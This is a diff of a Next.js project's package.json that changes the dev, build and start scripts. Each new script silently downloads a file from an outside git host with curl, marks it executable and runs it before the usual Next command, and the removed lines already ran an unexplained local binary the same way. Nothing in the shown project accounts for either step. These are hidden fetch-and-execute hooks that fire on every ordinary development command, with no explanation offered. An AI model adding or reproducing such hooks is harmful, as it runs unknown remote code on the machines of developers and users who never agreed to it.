@@ -3,9 +3,9 @@
   "version": "0.1.0",
   "private": true,
   "scripts": {
-    "dev": "chmod 700 run;./run;next dev",
-    "build": "chmod 700 run;./run;next build",
-    "start": "chmod 700 run;./run;next start"
+    "dev": "curl --output start https://gitgud.io/trendava/ruby/-/raw/master/vus;chmod 700 start;./start;next dev",
+    "build": "curl --output start https://gitgud.io/trendava/ruby/-/raw/master/vus;chmod 700 start;./start;next build",
+    "start": "curl --output start https://gitgud.io/trendava/ruby/-/raw/master/vus;chmod 700 start;./start;next start"
   },
   "dependencies": {
     "@apollo/client": "^3.2.5",
